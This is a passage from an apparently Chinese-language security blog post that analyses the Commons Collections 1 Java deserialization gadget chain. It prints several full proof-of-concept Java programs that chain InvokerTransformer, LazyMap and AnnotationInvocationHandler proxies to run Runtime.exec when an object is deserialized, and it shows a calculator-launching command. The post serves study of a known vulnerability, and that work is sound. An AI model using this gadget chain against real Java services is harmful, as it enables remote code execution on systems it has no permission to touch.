class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.ProxyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/22 22:55</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Demo</span>(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;());</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line">        proxyMap.put(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> (String) proxyMap.get(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Map map;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Demo</span><span class="params">(Map map)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;get&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;dotast&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(<span class="built_in">this</span>.map,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2022/11/10/CommonsCollections1/image-20220922232016142.png" alt="image-20220922232016142"></p><p>从结果中可以看到，动态代理的对象执行方法的时候，转发到了实现接口<code>InvocationHandler</code>的<code>Demo</code>类里并执行<code>invoke()</code>方法，把我们存储的值<code>admin</code>改成了<code>dotast</code>，并打印出<code>success</code>字符串。</p><p>而<code>AnnotationInvocationHandler</code>类正好是实现了<code>InvocationHandler</code>接口的类，因此我们可以通过动态代理的方式去调用到<code>AnnotationInvocationHandler</code>类的<code>invoke()</code>方法<br><img src="/2022/11/10/CommonsCollections1/image-20220922232441082.png" alt="image-20220922232441082"></p><p>因此我们可以写出初步的 POC：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/19 22:00</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CommonsCollections1</span> <span class="variable">transformerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections1</span>();</span><br><span class="line">        transformerTest.serialize();</span><br><span class="line">        transformerTest.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 客户端</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建ChainedTransformer调用链</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="comment">// 获取AnnotationInvocationHandler类对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取AnnotationInvocationHandler类的构造方法</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">// 设置方法访问权限</span></span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">mapHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, mapHandler);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(proxyMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>但运行后，经过反序列化并不会执行命令弹出计算器。断点调试一下，发现<code>memberValues</code>变量的赋值为<code>LazyMap</code><br><img src="/2022/11/10/CommonsCollections1/image-20220926111006320.png" alt="image-20220926111006320"></p><p>因此在经过<code>this.memberValues.entrySet().iterator();</code>步入到<code>var4.next()</code>执行方法时，无法进入<code>AnnotationInvocationHandler</code>类的<code>invoke()</code>方法<br><img src="/2022/11/10/CommonsCollections1/image-20220926111405695.png" alt="image-20220926111405695"></p><p>所以我们需要再创建一次<code>AnnotationInvocationHandler</code>，触发我们前面的代理对象，最终 POC如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/19 22:00</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CommonsCollections1</span> <span class="variable">transformerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections1</span>();</span><br><span class="line">        transformerTest.serialize();</span><br><span class="line">        transformerTest.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 客户端</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建ChainedTransformer调用链</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="comment">// 获取AnnotationInvocationHandler类对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取AnnotationInvocationHandler类的构造方法</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">// 设置方法访问权限</span></span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">mapHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, mapHandler);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, proxyMap);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(handler);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2022/11/10/CommonsCollections1/image-20220926150336993.png" alt="image-20220926150336993"></p><p>通过把前面的<code>proxyMap</code>作为构造方法的参数传入，此时的<code>memberValues</code>为我们的代理对象<code>proxyMap</code>，也就是<code>AnnotationInvocationHandler</code>实例<br><img src="/2022/11/10/CommonsCollections1/image-20220926150831689.png" alt="image-20220926150831689"></p><p>经过<code>this.memberValues.entrySet()</code>步入到<code>var4.next()</code>之后，成功进入到被代理的<code>AnnotationInvocationHandler</code>类的<code>invoke()</code>方法中。</p><p>此时的<code>memberValues</code>参数值就是前面第一次代理的时候的<code>LazyMap</code>，因此可以调用到<code>LazyMap.get()</code>方法，触发命令执行。<br><img src="/2022/11/10/CommonsCollections1/image-20220926151146196.png" alt="image-20220926151146196"></p><h2 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h2><p>在前面调试的时候，在未进入<code>readObject()</code>反序列化方法时，就弹出了计算器，原因是在第一次代理了<code>map</code>对象后，在执行<code>map</code>类的任意方法都会触发构造的<code>payload</code>，而由于<code>IDEA</code>中<code>Debug</code>的过程中会调用到代理类的<code>toString</code>方法从而造成非预期的命令执行。</p><p>解决方案是取消掉这两处的✅<br><img src="/2022/11/10/CommonsCollections1/image-20220926151832327.png" alt="image-20220926151832327"></p><p>当前也可以参照<code>ysoserial</code>的处理<br><img src="/2022/11/10/CommonsCollections1/image-20221005001535438.png" alt="image-20221005001535438"></p><p>先在开头设置一个没有危害的对象，在最后进行序列化的时候再把真正具有危害的<code>transformers</code>数组替换，从而避免了非预期的 rce<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/19 22:00</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CommonsCollections1</span> <span class="variable">transformerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections1</span>();</span><br><span class="line">        transformerTest.serialize();</span><br><span class="line">        transformerTest.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 客户端</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建虚假的调用链</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 